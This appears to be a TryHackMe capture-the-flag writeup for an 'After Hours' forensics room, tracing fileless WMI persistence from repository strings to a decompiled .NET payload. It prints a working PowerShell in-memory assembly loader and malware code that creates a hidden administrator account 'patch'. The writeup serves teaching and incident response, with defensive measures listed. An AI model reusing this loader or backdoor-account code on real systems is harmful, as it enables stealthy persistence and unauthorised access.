# 🌙 After Hours — TryHackMe Writeup
**Hacker Holidays 2026 | Day 12 | Byte Lotus Hotel**

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Digital%20Forensics-purple)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)

---

## 📋 Room Info

| Field | Details |
|-------|---------|
| **Room Name** | After Hours |
| **Event** | Hacker Holidays 2026 |
| **Day** | 12 of 14 |
| **Category** | Windows Forensics / Malware Analysis |
| **Vulnerabilities** | WMI Persistence · Fileless Malware · .NET Reverse Engineering |
| **Tools Used** | strings · grep · CyberChef · Python · ILSpy / ilspycmd |
| **Artifacts** | WMI Repository Files (OBJECTS.DATA, INDEX.BTR, MAPPING*.MAP) |

---

## 🧠 What We Learned

- WMI (Windows Management Instrumentation) can be abused for fileless persistence
- Malware can hide entirely inside WMI repository — never touching the disk as a normal file
- PowerShell encoded commands (`-enc`) hide malicious scripts from casual inspection
- .NET assemblies can be loaded and executed entirely in memory
- Layered encoding (Base64 → DEFLATE → .NET Assembly) is a common evasion technique
- ILSpy / ilspycmd can decompile .NET binaries back into readable C# source code
- Always check WMI repository during incident response — it's a common hiding spot

---

## 🗺️ Attack Chain (Attacker's Perspective)

```
Custom WMI Class Created (Win32_HardwareTelemetry)
        ↓
Compressed .NET payload stored in ConfigData property
        ↓
WMI Event Subscription triggers PowerShell
        ↓
PowerShell reads ConfigData → Base64 decode → DEFLATE decompress
        ↓
.NET Assembly loaded directly into memory
        ↓
Checks machine name (bytelotusdc) → creates backdoor user "patch"
```

---

## 🔍 Step 1 — Examine the WMI Repository Files

The room provides 5 WMI repository files:

| File | Purpose |
|------|---------|
| `OBJECTS.DATA` | Main data store — contains WMI class definitions and instances |
| `INDEX.BTR` | B-tree index for fast lookups |
| `MAPPING1.MAP` | Maps logical pages to physical pages |
| `MAPPING2.MAP` | Backup mapping file |
| `MAPPING3.MAP` | Backup mapping file |

Extract and navigate to them:
```bash
unzip attachments-*.zip
cd ~/Downloads
ls
```

> 📸 **Screenshot:** `screenshots/01_files_extracted.jpg`

---

## 🔍 Step 2 — Extract Strings from OBJECTS.DATA

The `OBJECTS.DATA` file contains the actual WMI class definitions and data. We use `strings` to extract readable text:

```bash
strings -a -n 6 OBJECTS.DATA > ascii.txt
strings -a -el -n 6 OBJECTS.DATA > utf16.txt
```

- `-a` — scan entire file
- `-n 6` — minimum string length of 6 characters
- `-el` — little-endian 16-bit characters (UTF-16LE — used by Windows)

> 📸 **Screenshot:** `screenshots/02_strings_extraction.jpg`

---

## 🔍 Step 3 — Search for Base64 Encoded Strings

Search for suspiciously long Base64 strings:

```bash
grep -EIn '[A-Za-z0-9+/]{80,}={0,2}' ascii.txt utf16.txt | head -20
```

This reveals several long Base64 strings. The most interesting one appears on a line containing:

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABm...
```

The `-enc` flag tells PowerShell to execute a Base64-encoded command — a classic obfuscation technique.

> 📸 **Screenshot:** `screenshots/03_base64_grep.jpg`

---

## 🔍 Step 4 — Decode the PowerShell Command

Copy the Base64 string after `-enc` and decode it in **CyberChef**:

1. Go to [CyberChef](https://gchq.github.io/CyberChef/)
2. Paste the Base64 string in the Input box
3. Add operation: **From Base64**
4. Add operation: **Decode text** → set to **UTF-16LE (1200)**
5. Click **Bake**

The decoded PowerShell reveals:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String($file),
    [IO.Compression.CompressionMode]::Decompress
);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0) {
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

**What this does:**
- Reads `ConfigData` from a custom WMI class `Win32_HardwareTelemetry`
- Base64 decodes and DEFLATE decompresses the data
- Loads the result as a **.NET assembly directly in memory**
- Executes it — **never touching the disk!**

> 📸 **Screenshot:** `screenshots/04_cyberchef_powershell.jpg`

---

## 🔍 Step 5 — Extract the ConfigData Payload

Now find the actual payload stored in `ConfigData`:

```bash
grep '^7VZPbFRFGP/' ascii.txt | head -1 > payload.b64
```

Decode it from Base64:
```bash
base64 -d payload.b64 > payload.deflate
```

> 📸 **Screenshot:** `screenshots/05_payload_extraction.jpg`

---

## 🔍 Step 6 — Decompress the DEFLATE Stream

The payload is compressed using raw DEFLATE (no zlib/gzip header). Use Python with `-15` wbits to handle raw DEFLATE:

```python
import zlib

data = open("payload.deflate", "rb").read()
out = zlib.decompress(data, -15)
open("payload.exe", "wb").write(out)
print("Written payload.exe:", len(out), "bytes")
```

Save as `decompress.py` and run:
```bash
python3 decompress.py
```

Verify the output:
```bash
file payload.exe
```

Expected output:
```
payload.exe: PE32 executable for MS Windows (GUI) Intel 80386 Mono/.Net assembly
```

> 📸 **Screenshot:** `screenshots/06_file_command.jpg`

---

## 🔍 Step 7 — Decompile the .NET Assembly

### Option A — ilspycmd (Terminal)

Install:
```bash
dotnet tool install ilspycmd -g
```

Decompile:
```bash
~/.dotnet/tools/ilspycmd payload.exe
```

### Option B — Quick strings search

```bash
strings payload.exe | grep -E '[A-Za-z0-9+/]{20,}={0,2}'
```

The decompiled `Main()` method reveals:

```csharp
static void Main(string[] args)
{
    string machineName = Environment.MachineName;
    if (machineName == "bytelotusdc")
    {
        Process.Start("cmd.exe", "/c net user patch <BASE64_PASSWORD> /add");
        Process.Start("cmd.exe", "/c net localgroup administrators patch /add");
    }
}
```

The password for the `patch` account is stored as a Base64 string!

> 📸 **Screenshot:** `screenshots/07_ilspy_main.jpg`

---

## 🔍 Step 8 — Decode the Final Flag

Copy the Base64 password string from the decompiled code → paste into CyberChef → **From Base64** → Flag appears! 🎉

> 📸 **Screenshot:** `screenshots/08_flag.jpg`

---

## 🛡️ Vulnerability / Technique Summary

| # | Technique | Description |
|---|-----------|-------------|
| 1 | WMI Persistence | Custom WMI class used to store and trigger malware |
| 2 | Fileless Execution | Payload never written to disk as a file |
| 3 | PowerShell Obfuscation | `-enc` flag hides script from basic monitoring |
| 4 | In-Memory .NET Loading | Assembly loaded via `Reflection.Assembly::Load` |
| 5 | Machine Name Check | Payload only activates on target machine |
| 6 | Layered Encoding | Base64 + DEFLATE + .NET to evade detection |

---

## 🔐 Defensive Measures

1. **Monitor WMI activity** — log `__EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding` creation
2. **Enable PowerShell Script Block Logging** — logs decoded PowerShell commands
3. **Use AMSI (Antimalware Scan Interface)** — scans in-memory .NET assemblies
4. **Audit custom WMI classes** — `Win32_HardwareTelemetry` doesn't exist by default
5. **Monitor `Reflection.Assembly::Load`** calls in PowerShell logs
6. **Include WMI repository in forensic collections** — `C:\Windows\System32\wbem\Repository\`

---

## 📁 Screenshots Guide

| File | Content | When to Take |
|------|---------|-------------|
| `01_files_extracted.jpg` | ls showing all 5 WMI files | After unzip |
| `02_strings_extraction.jpg` | strings commands running | After step 2 |
| `03_base64_grep.jpg` | grep output with long Base64 strings | After step 3 |
| `04_cyberchef_powershell.jpg` | CyberChef showing decoded PowerShell | After step 4 |
| `05_payload_extraction.jpg` | grep + base64 -d commands | After step 5 |
| `06_file_command.jpg` | `file payload.exe` showing .NET assembly | After step 6 |
| `07_ilspy_main.jpg` | Decompiled Main() with Base64 password | After step 7 |
| `08_flag.jpg` | CyberChef showing decoded flag | After step 8 |

---

## 💡 Key Concepts Explained

### What is WMI Persistence?
Windows Management Instrumentation (WMI) allows administrators to manage Windows systems. Attackers abuse it by:
- Creating custom WMI classes to **store payloads**
- Setting up **event subscriptions** to trigger execution automatically
- Everything stays in the WMI repository — **no files dropped on disk**

### What is Fileless Malware?
Traditional malware writes an `.exe` to disk. Fileless malware:
- Lives in memory, registry, or WMI repository
- Much harder to detect with traditional antivirus
- Leaves fewer forensic artifacts

### What is DEFLATE?
A compression algorithm used in ZIP files, gzip, and PNG images. The `-15` parameter in Python's `zlib.decompress(data, -15)` tells it to expect **raw DEFLATE** without any header wrapper.

---

## 🔗 References

- [TryHackMe Room](https://tryhackme.com/room/hh-afterhours)
- [WMI Persistence — MITRE ATT&CK T1546.003](https://attack.mitre.org/techniques/T1546/003/)
- [Fileless Malware — MITRE ATT&CK](https://attack.mitre.org/techniques/T1059/001/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [ILSpy GitHub](https://github.com/icsharpcode/ILSpy)
- [Hacker Holidays 2026](https://tryhackme.com/hackerholidays)

---

*Part of my [TryHackMe Hacker Holidays 2026](../README.md) writeup series*
